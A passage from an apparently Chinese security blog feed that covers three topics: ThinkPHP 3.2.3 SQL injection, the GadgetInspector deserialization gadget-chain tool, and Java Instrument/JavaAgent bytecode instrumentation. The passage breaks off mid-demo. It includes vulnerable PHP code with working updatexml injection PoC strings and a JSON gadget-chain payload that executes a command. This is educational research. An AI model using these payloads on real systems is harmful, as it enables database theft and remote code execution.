class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id[0]=exp&amp;id[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure><p>漏洞代码2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $User = M(<span class="string">"User"</span>);</span><br><span class="line">    $user[<span class="string">'id'</span>] = I(<span class="string">'id'</span>);</span><br><span class="line">    $data[<span class="string">'password'</span>] = I(<span class="string">'password'</span>);</span><br><span class="line">    $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">    var_dump($valu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[0]=bind&amp;id[1]=0%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1</span><br></pre></td></tr></table></figure><h2 id="0x05-order"><a href="#0x05-order" class="headerlink" title="0x05 order()"></a>0x05 order()</h2><p>漏洞代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $User = M(<span class="string">"User"</span>);</span><br><span class="line">    $order_by = I(<span class="string">'get.order'</span>);</span><br><span class="line">    $q = $User-&gt;where(<span class="string">'id'</span>,<span class="string">'1'</span>)-&gt;order($order_by)-&gt;find();</span><br><span class="line">    var_dump($q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?order[updatexml(1,concat(0x3a,user()),1)]</span><br></pre></td></tr></table></figure><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=55066&amp;fromuid=140579" target="_blank" rel="noopener">thinkphp3.2.3 注入漏洞总结</a></p><p><a href="https://xz.aliyun.com/t/2629" target="_blank" rel="noopener">ThinkPHP3.2 框架sql注入漏洞分析(2018-08-23)</a></p><p><a href="https://www.anquanke.com/post/id/104847" target="_blank" rel="noopener">Thinkphp3.2.3最新版update注入漏洞</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>浅析反序列化利用链自动化挖掘工具GadgetInspector</title>
    <link href="https://www.mi1k7ea.com/2020/05/11/%E6%B5%85%E6%9E%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7GadgetInspector/"/>
    <id>https://www.mi1k7ea.com/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/</id>
    <published>2020-05-11T14:45:22.000Z</published>
    <updated>2020-05-14T15:51:54.378Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-工具地址"><a href="#0x00-工具地址" class="headerlink" title="0x00 工具地址"></a>0x00 工具地址</h2><p><a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">https://github.com/JackOfMostTrades/gadgetinspector</a></p><h2 id="0x01-BlackHat议题解读"><a href="#0x01-BlackHat议题解读" class="headerlink" title="0x01 BlackHat议题解读"></a>0x01 BlackHat议题解读</h2><p>下面按照BlackHat 2018中的演讲PPT展开介绍。</p><h3 id="反序列化漏洞及利用工具概述"><a href="#反序列化漏洞及利用工具概述" class="headerlink" title="反序列化漏洞及利用工具概述"></a>反序列化漏洞及利用工具概述</h3><p>作者先介绍了什么是反序列化漏洞，其中提到了反序列化漏洞之所以危害那么大是因为反序列化器会自动调用魔法函数。</p><p>魔法函数包括主要的readObject()和readResolve()，当然还有finalize()。除此之外，还有那些实现了这些魔法函数并调用了其他方法的可序列化的JDK类，归纳来说如下：</p><ul><li>Object.readObject()</li><li>Object.readResolve()</li><li>Object.finalize()</li><li>HashMap<ul><li>Object.hashCode()</li><li>Object.equals()</li></ul></li><li>PriorityQueue<ul><li>Comparator.compare()</li><li>Comparable.compareTo()</li></ul></li></ul><p>如下图从hashCode()这个魔术方法看整条利用链：</p><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/1.png" alt=""></p><p>这里readObject()函数中是调用了hashCode()函数；看到AbstractTableModel$ff19274a类的hashCode()函数实现是由调用IFn接口类的invoke()函数的；再看到实现IFn接口类的FnCompose类，其中自己实现的invoke()函数中分别调用了两个IFn类型的成员变量的invoke()函数，其中包括FnEval类的invoke()函数，这个方法中就是执行系统命令的Runtime.exec()。</p><p>所以直接构造如下Exp即可成功触发反序列化漏洞：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"@class"</span>: <span class="string">"java.util.HashMap"</span></span><br><span class="line">    <span class="string">"members"</span>: [</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"@class"</span>: <span class="string">"AbstractTableModel$ff19274a"</span></span><br><span class="line">            __clojureFnMap: &#123;</span><br><span class="line">                hashCode: &#123;</span><br><span class="line">                    "@class": "FnCompose"</span><br><span class="line">                    f2: &#123; "@class": "FnConstant", value: "/usr/bin/calc" &#125;,</span><br><span class="line">                    f1: &#123; "@class": "FnEval" &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"val"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哪些Java库是有漏洞的？作者列出了以下几种（当然现在就不止了）：</p><ul><li>JDK (ObjectInputStream)</li><li>XStream (XML, JSON)</li><li>Jackson (JSON)</li><li>Genson (JSON)</li><li>JSON-IO (JSON)</li><li>FlexSON (JSON)</li></ul><p>那么如何挖掘这种类型的漏洞呢？其实和挖掘应用安全问题一样：</p><ul><li>外部输入会传进漏洞出发点；</li><li>现有的静态和动态工具可以很好地辅助发现此类问题；</li></ul><p>已知的一些反序列化利用工具：</p><ul><li>ysoserial：通常仅限于特定库中的链，并侧重于JDK ObjectInputStream的攻击利用；</li><li>marshalsec：可供选择的反序列化库的利用范围更广；</li></ul><p>但是，如果我们使用的是非标准反序列化库或者classpath上一些特定组合的库时，上面的工具就无法进行攻击利用了。</p><p>现存的Gadget链工具：</p><ul><li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>：收集已知的Gadget链和Exp；</li><li><a href="https://github.com/Contrast-Security-OSS/joogle" target="_blank" rel="noopener">joogle</a>：以编程方式查询类路径上的类型/方法；</li><li><a href="https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/" target="_blank" rel="noopener">Java Deserialization Scanner</a>：BurpSuite插件，使用已知payload（ysoserial）来发现和利用漏洞；</li><li><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>：用于许多库和Gadget链的反序列化payload生成器；</li><li><a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/" target="_blank" rel="noopener">NCC Group Burp Plugin</a>：“主要基于穆尼奥斯和米罗什的《星期五13：JSON攻击》”</li></ul><p>接着作者引出我们实际需要一个新工具，这个工具不需要自己生成payload，而是能够评估安全风险，即给定一个反序列化漏洞能否被攻击利用，有哪些利用方式比如RCE或DoS或SSRF。</p><p>因此，作者对该工具提出如下需求：</p><ul><li><p>不用于寻找漏洞，只在漏洞挖掘阶段使用此工具辅助发现问题；</p></li><li><p>它需要查看应用程序的整个classpath；</p></li><li><p>报错信息应该是误报而不是漏报；</p></li><li><p>它应该在字节码上操作；我们通常将整个classpath打包为一个war，并且可能没有源代码（特别是如果我们包括专有的第三方库）；</p></li><li><p>另外，它可能包括用Groovy、Scala、Clojure编写的库；</p></li></ul><h3 id="Gadget-Inspector"><a href="#Gadget-Inspector" class="headerlink" title="Gadget Inspector"></a>Gadget Inspector</h3><p>Gadget Inspector是一个为辅助挖掘Gadget链而生的Java字节码分析工具。</p><p>具有以下特点：</p><ul><li><p>在任意给定的classpath上操作，即特定的库或整个war包；</p></li><li><p>将发现的Gadget链作为方法调用序列进行报告；</p></li><li><p>执行一些简单的符号执行，以理解从方法参数到后续方法调用的可能数据流；</p></li><li><p>简化了许多假设，使代码分析更容易；</p></li></ul><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/2.png" alt=""></p><h4 id="原理步骤"><a href="#原理步骤" class="headerlink" title="原理步骤"></a>原理步骤</h4><h5 id="Step1-枚举类-方法的层次结构"><a href="#Step1-枚举类-方法的层次结构" class="headerlink" title="Step1.枚举类/方法的层次结构"></a>Step1.枚举类/方法的层次结构</h5><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/3.png" alt=""></p><h5 id="Step2-发现“透传”数据流"><a href="#Step2-发现“透传”数据流" class="headerlink" title="Step2.发现“透传”数据流"></a>Step2.发现“透传”数据流</h5><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/4.png" alt=""></p><h5 id="Step3-枚举“透传”调用图"><a href="#Step3-枚举“透传”调用图" class="headerlink" title="Step3.枚举“透传”调用图"></a>Step3.枚举“透传”调用图</h5><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/5.png" alt=""></p><h5 id="Step4-枚举使用已知Tricks的Sources"><a href="#Step4-枚举使用已知Tricks的Sources" class="headerlink" title="Step4.枚举使用已知Tricks的Sources"></a>Step4.枚举使用已知Tricks的Sources</h5><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/6.png" alt=""></p><h5 id="Step5-在调用图上应用BFS算法关联链"><a href="#Step5-在调用图上应用BFS算法关联链" class="headerlink" title="Step5.在调用图上应用BFS算法关联链"></a>Step5.在调用图上应用BFS算法关联链</h5><p><img src="/2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/7.png" alt=""></p><h4 id="反序列化库的灵活性"><a href="#反序列化库的灵活性" class="headerlink" title="反序列化库的灵活性"></a>反序列化库的灵活性</h4><p>Gadget Inspector支持自定义分析规则。</p><ul><li>什么被视为“可序列化”？<ul><li>对于JRE反序列化，任何实现java.lang.Serializable接口的类；</li><li>对于XStream，这取决于启用的转换器；当使用定制转换器时，它会变得更巧妙；</li><li>对于Jackson，任何没有参数构造函数的类；</li></ul></li><li>什么是反序列化源（即魔术方法）？<ul><li>对于Jackson，我们只从构造函数开始；</li></ul></li><li>我们应该关注哪些方法实现？<ul><li>对于JRE反序列化，所有实现了可序列化类的类；</li><li>对于Jackson，取决于注释和配置；</li></ul></li></ul><h4 id="提升空间"><a href="#提升空间" class="headerlink" title="提升空间"></a>提升空间</h4><ul><li>反射<ul><li>大多数反射调用被视为有趣的，导致FPs。例如，可以控制类，但不能控制方法名，反之亦然；</li><li>调用图枚举盲点，<code>foo.getClass().getMethod(&quot;bar&quot;).invoke(…)</code>；</li></ul></li><li>假设<ul><li>即使是很小的改进，Gadget Inspector也可以围绕条件可满足性或虚拟方法调用解析做出更好的决策，从而减少FPs；</li></ul></li><li>限制<ul><li>使用“已知的Tricks”来列举入口点，最初的研究仍然可以帮助我们找到许多其他聪明的方法来构建Gadget链；</li><li>带有“有趣行为”的sinks是硬编码的，许多空间可以发现和添加sinks；</li></ul></li></ul><h2 id="0x02-浅析Gadget-Inspector源码"><a href="#0x02-浅析Gadget-Inspector源码" class="headerlink" title="0x02 浅析Gadget Inspector源码"></a>0x02 浅析Gadget Inspector源码</h2><p>待补充…</p><h2 id="0x0n-参考"><a href="#0x0n-参考" class="headerlink" title="0x0n 参考"></a>0x0n 参考</h2><p><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></p><p><a href="https://paper.seebug.org/1034/" target="_blank" rel="noopener">Java 反序列化工具 gadgetinspector 初窥</a></p><p><a href="https://xz.aliyun.com/t/7058" target="_blank" rel="noopener">java反序列化利用链自动挖掘工具gadgetinspector源码浅析</a></p><p><a href="http://galaxylab.com.cn/java反序列化漏洞辅助工具之-gadgetinspector/" target="_blank" rel="noopener">Java反序列化漏洞辅助工具之 gadgetinspector</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-工具地址&quot;&gt;&lt;a href=&quot;#0x00-工具地址&quot; class=&quot;headerlink&quot; title=&quot;0x00 工具地址&quot;&gt;&lt;/a&gt;0x00 工具地址&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/JackOfMostTrad
      
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>浅析Java Instrument插桩技术</title>
    <link href="https://www.mi1k7ea.com/2020/05/10/%E6%B5%85%E6%9E%90Java-Instrument%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF/"/>
    <id>https://www.mi1k7ea.com/2020/05/10/浅析Java-Instrument插桩技术/</id>
    <published>2020-05-10T08:27:53.000Z</published>
    <updated>2020-05-10T15:53:24.909Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Java-Instrument"><a href="#0x01-Java-Instrument" class="headerlink" title="0x01 Java Instrument"></a>0x01 Java Instrument</h2><h3 id="Instrument简介"><a href="#Instrument简介" class="headerlink" title="Instrument简介"></a>Instrument简介</h3><p>利用 Java 代码，即 java.lang.instrument 做动态 Instrumentation 是 Java SE 5 的新特性，它把 Java 的 instrument 功能从本地代码中解放出来，使之可以用 Java 代码的方式解决问题。使用 Instrumentation，开发者可以构建一个独立于应用程序的代理程序（Agent），用来监测和协助运行在 JVM 上的程序，甚至能够替换和修改某些类的定义。有了这样的功能，开发者就可以实现更为灵活的运行时虚拟机监控和 Java 类操作了，这样的特性实际上提供了一种虚拟机级别支持的 AOP 实现方式，使得开发者无需对 JDK 做任何升级和改动，就可以实现某些 AOP 的功能了。</p><p>要想使用Java插桩，需要用到两个技术JavaAgent与Javassist 。前者用于拦截ClassLoad装载，后者用于操作修改class文件。</p><p>在应用启动时，通过<code>-javaagent</code>参数来指定一个代理程序。</p><p>详细介绍见：<a href="https://www.ibm.com/developerworks/cn/java/j-lo-jse61/" target="_blank" rel="noopener">Java SE 6 新特性：Instrumentation 新功能</a></p><h3 id="Instrument整体流程"><a href="#Instrument整体流程" class="headerlink" title="Instrument整体流程"></a>Instrument整体流程</h3><p>Instrument是JVM提供的一个可以修改已加载类的类库，专门为Java语言编写的插桩服务提供支持。它需要依赖JVMTI的Attach API机制实现。在JDK 1.6以前，Instrument只能在JVM刚启动开始加载类时生效，而在JDK 1.6之后，Instrument支持了在运行时对类定义的修改。</p><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/1.png" alt=""></p><ol><li>在JVM启动时，通过JVM参数-javaagent，传入agent jar，Instrument Agent被加载，调用其Agent_OnLoad函数；</li><li>在Instrument Agent 初始化时，注册了JVMTI初始化函数eventHandlerVMinit；</li><li>在JVM启动时，会调用初始化函数eventHandlerVMinit，启动了Instrument Agent；</li><li>用sun.instrument.instrumentationImpl类里的方法loadClassAndCallPremain方法去初始化Premain-Class指定类的premain方法。初始化函数eventHandlerVMinit，注册了class解析的ClassFileLoadHook函数；</li><li>调用应用程序的main开始执行，准备解析；</li><li>解析Class之前，JVM调用JVMTI的ClassFileLoadHook函数，钩子函数调用sun.instrument.instrumentationImpl类里的transform方法，通过TransformerManager的transformer方法最终调用我们自定义的Transformer类的transform方法；</li><li>因为字节码在解析Class之前改的，直接使用修改后的字节码的数据流替代，最后进入Class解析，对整个Class解析无影响；</li><li>重新加载Class依然重新走6-7步骤；</li></ol><h3 id="JavaAgent"><a href="#JavaAgent" class="headerlink" title="JavaAgent"></a>JavaAgent</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>JavaAgent本质上可以理解为一个插件，该插件就是一个精心提供的jar包，这个jar包通过JVMTI（JVM Tool Interface）完成加载，最终借助JPLISAgent（Java Programming Language Instrumentation Services Agent）完成对目标代码的修改。</p><p>通过JavaAgent技术进行类的字节码修改最主要使用的就是Java Instrumentation API。</p><p>JavaAgent技术的主要功能如下：</p><ul><li>可以在加载Java文件之前做拦截把字节码做修改；</li><li>可以在运行期将已经加载的类的字节码做变更；</li><li>还有其他的一些小众的功能：<ul><li>获取所有已经被加载过的类</li><li>获取所有已经被初始化过了的类</li><li>获取某个对象的大小</li><li>将某个jar加入到bootstrapclasspath里作为高优先级被bootstrapClassloader加载</li><li>将某个jar加入到classpath里供AppClassloard去加载</li><li>设置某些native方法的前缀，主要在查找native方法的时候做规则匹配</li></ul></li></ul><p>下图说明了是否使用JavaAgent的时候的区别。当使用JavaAgent之后，加载的class都会被拦截，就可以在拦截的过程中进行修改：</p><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/2.png" alt=""></p><p>JavaAgent最后展现形式是一个Jar包，有以下特性：</p><ol><li>必须 META-INF/MANIFEST.MF中指定Premain-Class 设定启agent启动类；</li><li>在启动类需写明启动方法<code>public static void main(String arg,)</code>；</li><li>不可直接运行，只能通过JVM参数<code>-javaagent:xxx.jar</code>附着于其它JVM进程运行；</li></ol><h4 id="启动时修改"><a href="#启动时修改" class="headerlink" title="启动时修改"></a>启动时修改</h4><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/3.png" alt=""></p><p>启动时修改主要是在JVM启动时，执行native函数的Agent_OnLoad方法，在方法执行时，执行如下步骤：</p><ul><li>创建InstrumentationImpl对象</li><li>监听ClassFileLoadHook事件</li><li>调用InstrumentationImpl的loadClassAndCallPremain方法，在这个方法里会去调用JavaAgent里MANIFEST.MF里指定的Premain-Class类的premain方法</li></ul><h4 id="运行时修改"><a href="#运行时修改" class="headerlink" title="运行时修改"></a>运行时修改</h4><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/4.png" alt=""></p><p>运行时修改主要是通过JVM的attach机制来请求目标JVM加载对应的agent，执行native函数的Agent_OnAttach方法，在方法执行时，执行如下步骤：</p><ul><li>创建InstrumentationImpl对象</li><li>监听ClassFileLoadHook事件</li><li>调用InstrumentationImpl的loadClassAndCallAgentmain方法，在这个方法里会去调用javaagent里MANIFEST.MF里指定的Agentmain-Class类的agentmain方法</li></ul><h4 id="ClassFileLoadHook和TransFormClassFile"><a href="#ClassFileLoadHook和TransFormClassFile" class="headerlink" title="ClassFileLoadHook和TransFormClassFile"></a>ClassFileLoadHook和TransFormClassFile</h4><p>从前面可以看出整体流程中有两个部分是具有共性的，分别为：</p><ul><li>ClassFileLoadHook</li><li>TranFormClassFile</li></ul><p>ClassFileLoadHook是一个JVMTI事件，该事件是Instrument Agent的一个核心事件，主要是在读取字节码文件回调时调用，内部调用了TransFormClassFile函数。</p><p>TransFormClassFile的主要作用是调用java.lang.instrument.ClassFileTransformer的tranform方法，该方法由开发者实现，通过instrument的addTransformer方法进行注册。</p><p>通过以上描述可以看出在字节码文件加载的时候，会触发ClassFileLoadHook事件，该事件调用TransFormClassFile，通过经由instrument的addTransformer注册的方法完成整体的字节码修改。</p><p>对于已加载的类，需要调用retransformClass函数，然后经由redefineClasses函数，在读取已加载的字节码文件后，若该字节码文件对应的类关注了ClassFileLoadHook事件，则调用ClassFileLoadHook事件。后续流程与类加载时字节码替换一致。</p><h2 id="0x02-常用字节码操作工具"><a href="#0x02-常用字节码操作工具" class="headerlink" title="0x02 常用字节码操作工具"></a>0x02 常用字节码操作工具</h2><h3 id="Javaassist"><a href="#Javaassist" class="headerlink" title="Javaassist"></a>Javaassist</h3><p>Javaassist是一个开源的分析、编辑和创建Java字节码的类库。性能消耗较大，但容易使用。</p><p>特点：简单，性能比ASM低。</p><h3 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h3><p>ASM是一个轻量级的Java字节码操作框架，直接涉及到JVM底层的操作和指令。性能高，功能丰富。</p><p>特点：复杂，性能高，一般更为常用。</p><h3 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h3><p>BCEL这是Apache Software Fundation的Jakarta项目的一部分。BCEL可以让你深入JVM汇编语言进行类的操作的细节。</p><h2 id="0x03-Instrument的基本功能和用法"><a href="#0x03-Instrument的基本功能和用法" class="headerlink" title="0x03 Instrument的基本功能和用法"></a>0x03 Instrument的基本功能和用法</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>java.lang.instrument包的具体实现，依赖于 JVMTI。JVMTI（Java Virtual Machine Tool Interface）是一套由 Java 虚拟机提供的，为 JVM 相关的工具提供的本地编程接口集合。JVMTI 提供了一套”代理”程序机制，可以支持第三方工具程序以代理的方式连接和访问 JVM，并利用 JVMTI 提供的丰富的编程接口，完成很多跟 JVM 相关的功能。事实上，java.lang.instrument 包的实现，也就是基于这种机制的：在 Instrumentation 的实现当中，存在一个 JVMTI 的代理程序，通过调用 JVMTI 当中 Java 类相关的函数来完成 Java 类的动态操作。除开 Instrumentation 功能外，JVMTI 还在虚拟机内存管理，线程控制，方法和变量操作等等方面提供了大量有价值的函数。</p><p>Instrumentation 的最大作用，就是<strong>类定义动态改变和操作</strong>。在 Java SE 5 及其后续版本当中，开发者可以在一个普通 Java 程序（带有 main 函数的 Java 类）运行时，通过<code>-javaagent</code>参数指定一个特定的 jar 文件（包含 Instrumentation 代理）来启动 Instrumentation 的代理程序。</p><h3 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h3><h4 id="premain"><a href="#premain" class="headerlink" title="premain()"></a>premain()</h4><p>在主程序运行之前的代理程序使用premain()。</p><p>有如下两种方式编写premain函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs,Instrumentation inst)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs)</span></span>;</span><br></pre></td></tr></table></figure><p>注意，第一种定义方式优先执行于第二种定义方式。</p><p>两个参数解释：</p><ul><li>agentArgs是函数得到的程序参数，随同”-javaagent”一起传入，传入的是一个字符串</li><li>Inst是一个java.lang.instrument.Instrumentation的实例，由JVM自动传入</li></ul><h4 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain()"></a>agentmain()</h4><p>在主程序运行之后的代理程序使用agentmain()。</p><p>定义方式和premain类似：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String agentArgs,Instrumentation inst)</span></span></span><br></pre></td></tr></table></figure><h4 id="addTransformer"><a href="#addTransformer" class="headerlink" title="addTransformer()"></a>addTransformer()</h4><p>增加一个Class文件的转换器，该转换器用于改变class二进制流的数据，参数canRetransform设置是否允许重新转换。</p><h4 id="redefineClasses"><a href="#redefineClasses" class="headerlink" title="redefineClasses()"></a>redefineClasses()</h4><p>类加载之前，重新定义class文件，ClassDefinition表示一个类新的定义，如果在类加载之后，需要用retransformClasses方法重新定义。</p><h4 id="retransformClasses"><a href="#retransformClasses" class="headerlink" title="retransformClasses()"></a>retransformClasses()</h4><p>在类加载之后，重新定义class。事实上，该方法update了一个类。</p><h4 id="appendToBootstrapClassLoaderSearch"><a href="#appendToBootstrapClassLoaderSearch" class="headerlink" title="appendToBootstrapClassLoaderSearch()"></a>appendToBootstrapClassLoaderSearch()</h4><p>添加jar文件到BootstrapClassLoader中。</p><h4 id="appendToSystemClassLoaderSearch"><a href="#appendToSystemClassLoaderSearch" class="headerlink" title="appendToSystemClassLoaderSearch()"></a>appendToSystemClassLoaderSearch()</h4><p>添加jar文件到system class loader。</p><h4 id="getAllLoadedClasses"><a href="#getAllLoadedClasses" class="headerlink" title="getAllLoadedClasses()"></a>getAllLoadedClasses()</h4><p>获取加载的所有类数组。</p><h3 id="Javassist的特殊语法"><a href="#Javassist的特殊语法" class="headerlink" title="Javassist的特殊语法"></a>Javassist的特殊语法</h3><p><img src="/2020/05/10/浅析Java-Instrument插桩技术/5.png" alt=""></p><h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><h4 id="编写premain函数"><a href="#编写premain函数" class="headerlink" title="编写premain函数"></a>编写premain函数</h4><p>编写一个 Java 类，包含如下两个方法当中的任何一个：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span>;  [<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs)</span></span>; [<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>其中，[1] 的优先级比 [2] 高，将会被优先执行（[1] 和 [2] 同时存在时，[2] 被忽略）。</p><p>在这个 premain 函数中，开发者可以进行对类的各种操作。</p><p>agentArgs 是 premain 函数得到的程序参数，随同 “– javaagent”一起传入。与 main 函数不同的是，这个参数是一个字符串而不是一个字符串数组，如果程序参数有多个，程序将自行解析这个字符串。</p><p>Inst 是一个 java.lang.instrument.Instrumentation 的实例，由 JVM 自动传入。</p><p>java.lang.instrument.Instrumentation 是 instrument 包中定义的一个接口，也是这个包的核心部分，集中了其中几乎所有的功能方法，例如类定义的转换和操作等等。</p><h4 id="jar文件打包"><a href="#jar文件打包" class="headerlink" title="jar文件打包"></a>jar文件打包</h4><p>将这个 Java 类打包成一个 jar 文件，并在其中的 manifest 属性当中加入” Premain-Class”来指定步骤 1 当中编写的那个带有 premain 的 Java 类。</p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>用如下方式运行带有 Instrumentation 的 Java 程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:jar 文件的位置 [= 传入 premain 的参数 ]</span><br></pre></td></tr></table></figure><h2 id="0x04-Demo"><a href="#0x04-Demo" class="headerlink" title="0x04 Demo"></a>0x04 Demo</h2><h3 id="使用premain-在主程序运行之前代理"><a href="#使用premain-在主程序运行之前代理" class="headerlink" title="使用premain()在主程序运行之前代理"></a>使用premain()在主程序运行之前代理</h3><p>要使用instrument的类修改功能，我们需要实现它提供的ClassFileTransformer接口，定义一个类文件转换器。接口中的transform()方法会在类文件被加载时调用，而在transform方法里，我们可以利用上文中的ASM或Javassist对传入的字节码进行改写或替换，生成新的字节码数组后返回。</p><p>每当加载一个class文件时输出当前class文件名：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main.java.mi1k7eatest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span 